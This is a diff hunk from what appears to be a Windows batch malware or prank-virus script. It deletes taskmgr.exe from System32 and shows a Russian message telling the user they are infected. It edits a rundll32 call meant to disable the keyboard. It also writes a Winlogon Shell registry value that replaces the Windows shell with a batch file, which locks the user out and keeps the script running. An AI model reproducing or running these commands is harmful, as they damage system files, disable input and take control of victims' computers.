@@ -114,7 +114,7 @@ Del C:\Windows\System32\taskmgr.exe /q
 
 msg * ТЫ ЗАРАЖЕН ТАСК МЕНЕДЖЕР УДАЛЕН ЖДИ 60 СЕКУЕТ СЕКУНД
 
-rundll32 user,disableoemlayer
+rundll32 keyboard,disable > nul
 
 @echo off
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "C:\Windows\System32\git.bat" /f
